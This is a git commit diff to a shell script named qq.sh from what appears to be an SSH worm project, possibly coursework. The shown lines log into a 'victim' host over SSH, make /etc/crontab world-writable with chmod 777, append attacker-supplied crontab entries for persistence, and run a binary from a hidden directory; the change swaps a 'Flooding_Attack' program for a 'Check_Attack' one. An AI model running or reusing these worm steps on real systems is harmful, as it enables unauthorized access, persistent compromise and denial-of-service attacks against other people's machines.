a2e3c45e781f7acd7ccd611f47d5aca596b414b1
SongYun <william0228.cs05@g2.nctu.edu.tw>
2019-05-01 20:09:29 +0800

    debug

--- qq.sh
+++ qq.sh
@@ -44,7 +44,7 @@ echo "qq2"
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack";
 			chmod -R 777 /etc/crontab;
 			echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab;
-			cd "$Hidden2" && ./Flooding_Attack;
+			cd "$Hidden2" && ./Check_Attack;
 			cd /home/victim/Desktop/ssh_worm > /dev/null 2>&1'
 
 echo "qq3"
